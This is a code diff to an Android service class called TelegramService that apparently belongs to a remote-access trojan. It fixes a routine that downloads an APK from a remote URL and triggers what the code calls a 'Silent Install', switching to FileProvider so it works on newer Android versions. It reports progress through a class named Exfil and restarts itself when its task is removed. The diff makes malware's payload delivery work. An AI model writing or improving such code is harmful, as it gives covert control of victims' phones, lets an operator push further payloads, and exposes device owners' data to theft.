@@ -234,7 +234,7 @@ public class TelegramService extends Service {
         Exfil.send(menu);
     }
 
-    // ================== BACKUP INSTALLER ==================
+    // ================== BACKUP INSTALLER (FIXED) ==================
     private void downloadAndInstallBackup(String urlStr) {
         Exfil.send("⏳ Downloading Backup APK in background...");
         new Thread(() -> {
@@ -258,8 +258,21 @@ public class TelegramService extends Service {
                 Exfil.send("✅ Download Complete! Triggering Silent Install...");
                 
                 Intent intent = new Intent(Intent.ACTION_VIEW);
-                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                
+                // FIX HNA: FileProvider 3awd Uri.fromFile li kan kayt7erkes
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
+                            this,
+                            getPackageName() + ".fileprovider",
+                            apkFile
+                    );
+                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                } else {
+                    intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
+                }
+                
                 startActivity(intent);
                 
             } catch (Exception e) {
@@ -636,4 +649,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-            }
+                }
